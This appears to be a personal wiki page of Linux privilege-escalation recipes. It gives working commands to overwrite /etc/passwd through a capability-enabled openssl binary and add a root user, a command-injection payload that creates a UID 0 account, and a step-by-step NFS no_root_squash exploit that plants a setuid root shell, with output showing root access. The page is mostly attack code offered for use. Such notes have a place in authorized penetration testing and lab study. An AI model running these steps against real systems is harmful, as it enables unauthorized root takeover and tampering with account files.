---
title: "Linux"
date: 2025-10-03
draft: false
type: wiki
---

# /home/user/openssl =ep (empty capabilities)

Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:

```console
cp /etc/passwd /tmp/passwd.orig
cp /etc/passwd /tmp/passwd.custom
```

Now, a custom user will be created and added to `/tmp/passwd.custom` with `customPassword` and as root user (UID = GID = 0):

```console
echo 'ceso:'"$( openssl passwd -6 -salt xyz customPassword )"':0:0::/tmp:/bin/bash' >> /tmp/passwd.custom
```

Now, create a custom `key.pem` and `cert.pem` with openssl:

```console
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

Encrypt the new custom passwd:

```console
openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
```

Now, decrypt the custom passwd overwritting in the process the real one (`/etc/passwd`):

```console
cd /
/home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
```

And finally, just login with the user created with root privileges by using `customPassword`:

```console
su - ceso
```

-----------------------------

# Command web injection: add user

```console
/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i
```

-----------------------------

# NFS; no_root_squash,insecure,rw

If `/etc/exports` has a line like:

```console
/srv/pelota 192.168.42.0/24(insecure,rw)
/srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)
```

NFS is being exported and you and you have ssh access to the machine.
From your attacker machine **while logged as root** user run:

```console
ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
mount -t nfs 127.0.0.1:/srv/pelota my_share
cd my_share
cat > shell.c<<EOF
#include <unistd.h>
int main(){
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
EOF
gcc shell.c -o shell
chmod u+s shell
```

Now from inside a SSH session on the victim machine (in this example `192.168.42.32`):

```console
bash-4.2$ cd /srv/pelota
bash-4.2$ ./shell
bash-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(megumin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

-----------------------------
